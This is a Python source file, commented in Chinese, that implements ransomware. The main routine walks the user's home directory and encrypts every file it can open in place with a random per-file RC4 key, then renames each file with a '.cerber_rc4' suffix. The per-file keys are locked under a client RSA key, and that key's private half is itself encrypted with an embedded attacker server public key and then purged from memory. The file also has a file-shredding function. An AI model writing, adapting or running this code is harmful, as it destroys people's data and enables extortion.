import variables
import asymmetric
import get_files# 获取文件列表
import symmetric
import environment
import generate_keys
import secrets
from Crypto.Cipher import ARC4

import os
import string
import random
import base64
import pickle
import gc
import subprocess

from Crypto.PublicKey import RSA
from Crypto.Hash import MD5
from Crypto.Hash import SHA
from Crypto import Random
from Crypto.Cipher import PKCS1_OAEP
def shred(file_name, passes=1):
    # 生成随机数据
    def generate_data(length):
        chars = string.ascii_lowercase + string.ascii_uppercase + string.digits
        return ''.join(random.SystemRandom().choice(chars) for _ in range(length))

    # 如果文件不存在，则返回False
    if (not os.path.isfile(file_name)):
        return False

    # 获取文件大小
    ld = os.path.getsize(file_name)
    with open(file_name, "w+") as fh:
        # 写入随机数据多次来覆盖原始数据
        for _ in range(int(passes)):
            data = generate_data(ld)
            fh.write(data)
            fh.seek(0, 0)
    # 删除原始文件
    os.remove(file_name)




def encrypt_priv_key(msg, key):
    n = 127
    x = [msg[i:i+n] for i in range(0, len(msg), n)]

    key = RSA.importKey(key)
    cipher = PKCS1_OAEP.new(key)
    encrypted = []
    for i in x:
        ciphertext = cipher.encrypt(i)
        encrypted.append(ciphertext)
    return encrypted


def encrypt_file_inplace(files):
    """
    加密文件并原地覆盖文件内容

    """
    cs4_and_base64_path = []
    for found_file in files:
        key=secrets.token_bytes(32)
        cipher = ARC4.new(key)
        found_file = base64.b64decode(found_file)
        try:
            with open(found_file, 'r+b') as file:  # 以读写二进制形式打开文件
                print(found_file)
                data = bytearray(file.read())  # 读取整个文件到内存中
                encrypted_data = cipher.encrypt(data)  # 使用RC4算法加密数据
                file.seek(0)  # 定位到文件开头
                file.write(encrypted_data)  # 将加密后的数据覆盖写入文件
                file.truncate(len(encrypted_data))  # 截断文件，确保它完全加密      
        except:
                continue
        os.rename(found_file,found_file+ b'.cerber_rc4')
        #print('文件加密完成！')  # 打印加密完成提示信息
        base64_new_file_name = base64.b64encode(found_file).decode('utf-8') 
        cs4_and_base64_path.append((key, base64_new_file_name))
    return cs4_and_base64_path
    
# 要加密的文件名和密钥
#filename = 'input.txt'
#key = b'your_key_here'

# 加密文件并在原地覆盖文件内容
#encrypt_file_inplace(filename, key)

def menu():
    try:
        os.mkdir(variables.ransomware_path)  # 尝试创建目录"/home/tarcisio/test/"
    except OSError:
        pass  # 如果目录已存在则跳过
    #kill_databases()  # 关闭数据库
    files = get_files.find_files(variables.home)  # 获取文件列表
    
    rsa_object = asymmetric.assymetric()  # 创建非对称加密对象
    rsa_object.generate_keys()  # 生成密钥对

    Client_private_key = rsa_object.private_key_PEM  # 获取客户端私钥
    Client_public_key = rsa_object.public_key_PEM  # 获取客户端公钥


    encrypted_client_private_key = encrypt_priv_key(Client_private_key, variables.server_public_key)  # 用服务器公钥加密客户端私钥
    if not os.path.exists(os.path.dirname(variables.ransomware_path)):
        os.makedirs(os.path.dirname(variables.ransomware_path))
    # 保存加密后的客户端私钥
    with open(variables.encrypted_client_private_key_path, 'wb') as output:#/home/lt/gonncry/encrypted_client_private_key.key
        pickle.dump(encrypted_client_private_key, output, pickle.HIGHEST_PROTOCOL)#将对象序列化为字节流并将其写入文件的功能

    # 保存客户端公钥
    with open(variables.client_public_key_path, 'wb') as f:
        f.write(Client_public_key)

    Client_private_key = None  # 清除客户端私钥
    rsa_object = None  # 清除非对称加密对象
    del rsa_object
    del Client_private_key
    gc.collect()  # 垃圾回收

    client_public_key_object = RSA.importKey(Client_public_key)  # 导入客户端公钥对象
    client_public_key_object_cipher = PKCS1_OAEP.new(client_public_key_object)  # 创建公钥加密对象







    # 文件加密开始
    #aes_keys_and_base64_path = start_encryption(files)  # 开始加密文件
    aes_keys_and_base64_path=encrypt_file_inplace(files)

    enc_aes_key_and_base64_path = []
    for _ in aes_keys_and_base64_path:
        aes_key = _[0]  # 获取AES密钥
        base64_path = _[1]  # 获取文件路径
        encrypted_aes_key = client_public_key_object_cipher.encrypt(aes_key)  # 用客户端公钥加密AES密钥
        enc_aes_key_and_base64_path.append((encrypted_aes_key, base64_path))

    aes_keys_and_base64_path = None  # 清除AES密钥和路径
    del aes_keys_and_base64_path
    gc.collect()  # 垃圾回收

    # 保存加密后的AES密钥和文件路径
    with open(variables.aes_encrypted_keys_path, 'w') as f:
        for _ in enc_aes_key_and_base64_path:
            line = base64.b64encode(_[0]) + " " + _[1] + "\n"
            f.write(line)

    enc_aes_key_and_base64_path = None  # 清除加密后的AES密钥和路径
    del enc_aes_key_and_base64_path
    gc.collect()




if __name__ == "__main__":
    menu()
    
